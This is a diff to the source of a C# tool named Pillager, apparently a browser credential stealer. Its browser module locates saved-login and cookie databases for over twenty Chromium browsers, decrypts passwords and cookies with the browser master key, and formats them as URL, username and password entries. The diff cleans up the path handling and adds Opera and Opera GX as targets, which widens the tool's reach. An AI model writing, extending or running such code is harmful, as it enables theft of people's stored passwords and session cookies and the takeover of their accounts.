@@ -2,7 +2,6 @@
 using System.Collections.Generic;
 using System.IO;
 using System.Linq;
-using System.Runtime.Remoting.Messaging;
 using System.Security.Cryptography;
 using System.Text;
 using Pillager.Helper;
@@ -21,28 +20,30 @@ namespace Pillager.Browsers
 
         public static Dictionary<string, string> browserOnChromium = new Dictionary<string, string>
         {
-            { "Chrome", "Google\\Chrome\\User Data" } ,
-            { "Chrome Beta", "Google\\Chrome Beta\\User Data" } ,
-            { "Chromium", "Chromium\\User Data" } ,
-            { "Chrome SxS", "Google\\Chrome SxS\\User Data" },
-            { "Edge", "Microsoft\\Edge\\User Data" } ,
-            { "Brave-Browser", "BraveSoftware\\Brave-Browser\\User Data" } ,
-            { "QQBrowser", "Tencent\\QQBrowser\\User Data" } ,
-            { "SogouExplorer", "Sogou\\SogouExplorer\\User Data" } ,
-            { "360ChromeX", "360ChromeX\\Chrome\\User Data" } ,
-            { "360Chrome", "360Chrome\\Chrome\\User Data" } ,
-            { "Vivaldi", "Vivaldi\\User Data" } ,
-            { "CocCoc", "CocCoc\\Browser\\User Data" },
-            { "Torch", "Torch\\User Data" },
-            { "Kometa", "Kometa\\User Data" },
-            { "Orbitum", "Orbitum\\User Data" },
-            { "CentBrowser", "CentBrowser\\User Data" },
-            { "7Star", "7Star\\7Star\\User Data" },
-            { "Sputnik", "Sputnik\\Sputnik\\User Data" },
-            { "Epic Privacy Browser", "Epic Privacy Browser\\User Data" },
-            { "Uran", "uCozMedia\\Uran\\User Data" },
-            { "Yandex", "Yandex\\YandexBrowser\\User Data" },
-            { "Iridium", "Iridium\\User Data" },
+            { "Chrome", Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData),"Google\\Chrome\\User Data" )} ,
+            { "Chrome Beta",Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData), "Google\\Chrome Beta\\User Data" )},
+            { "Chromium", Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData),"Chromium\\User Data" )} ,
+            { "Chrome SxS", Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData),"Google\\Chrome SxS\\User Data" )},
+            { "Edge", Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData),"Microsoft\\Edge\\User Data") } ,
+            { "Brave-Browser", Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData),"BraveSoftware\\Brave-Browser\\User Data") } ,
+            { "QQBrowser",Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData), "Tencent\\QQBrowser\\User Data") } ,
+            { "SogouExplorer", Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData),"Sogou\\SogouExplorer\\User Data") } ,
+            { "360ChromeX", Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData),"360ChromeX\\Chrome\\User Data" )} ,
+            { "360Chrome",Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData), "360Chrome\\Chrome\\User Data") } ,
+            { "Vivaldi",Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData), "Vivaldi\\User Data") } ,
+            { "CocCoc", Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData),"CocCoc\\Browser\\User Data" )},
+            { "Torch", Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData),"Torch\\User Data" )},
+            { "Kometa", Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData),"Kometa\\User Data" )},
+            { "Orbitum", Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData),"Orbitum\\User Data" )},
+            { "CentBrowser",Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData), "CentBrowser\\User Data" )},
+            { "7Star", Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData),"7Star\\7Star\\User Data" )},
+            { "Sputnik", Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData),"Sputnik\\Sputnik\\User Data" )},
+            { "Epic Privacy Browser", Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData),"Epic Privacy Browser\\User Data" )},
+            { "Uran",Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData), "uCozMedia\\Uran\\User Data" )},
+            { "Yandex", Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData),"Yandex\\YandexBrowser\\User Data" )},
+            { "Iridium", Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData),"Iridium\\User Data" )},
+            { "Opera", Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData),"Opera Software\\Opera Stable" )},
+            { "Opera GX", Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData),"Opera Software\\Opera GX Stable" )},
         };
 
 
@@ -119,7 +120,7 @@ namespace Pillager.Browsers
                         string username = handler.GetValue(i, "username_value");
                         string crypt = handler.GetValue(i, "password_value");
                         string password = Encoding.UTF8.GetString(DecryptData(Convert.FromBase64String(crypt)));
-                        if (url != null && url != "" && username != null && username != "" && !(password is null) && password.Length > 0)
+                        if (!string.IsNullOrEmpty(url) && !string.IsNullOrEmpty(username) && !string.IsNullOrEmpty(password))
                         {
                             passwords.Append("\t[URL] -> {" + url + "}\n\t[USERNAME] -> {" + username + "}\n\t[PASSWORD] -> {" + password + "}\n");
                             passwords.AppendLine();
@@ -156,7 +157,7 @@ namespace Pillager.Browsers
                 }
                 catch { }
             }
-            return history.ToString(); ;
+            return history.ToString();
         }
 
         public static string Chrome_cookies()
@@ -166,7 +167,7 @@ namespace Pillager.Browsers
             {
                 string chrome_cookie_path = Path.Combine(BrowserPath, profile + "\\Cookies");
                 string chrome_100plus_cookie_path = Path.Combine(BrowserPath, profile + "\\Network\\Cookies");
-                if (!File.Exists(chrome_cookie_path) == true)
+                if (!File.Exists(chrome_cookie_path))
                     chrome_cookie_path = chrome_100plus_cookie_path;
                 if (!File.Exists(chrome_cookie_path))
                     continue;
@@ -196,9 +197,8 @@ namespace Pillager.Browsers
                             string name = handler.GetValue(i, "name");
                             string crypt = handler.GetValue(i, "encrypted_value");
                             string path = handler.GetValue(i, "path");
-                            long expDate;
                             double expDateDouble = 0;
-                            long.TryParse(handler.GetValue(i, "expires_utc"), out expDate);
+                            long.TryParse(handler.GetValue(i, "expires_utc"), out var expDate);
                             if ((expDate / 1000000.000000000000) - 11644473600 > 0)
                                 expDateDouble = (expDate / 1000000.000000000000000) - 11644473600;
                             string cookie = Encoding.UTF8.GetString(DecryptData(Convert.FromBase64String(crypt)));
@@ -279,7 +279,7 @@ namespace Pillager.Browsers
             {
                 try
                 {
-                    string chromepath = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData), browser.Value);
+                    string chromepath = browser.Value;
                     BrowserName = browser.Key;
                     BrowserPath = chromepath;
                     MasterKey = GetMasterKey();
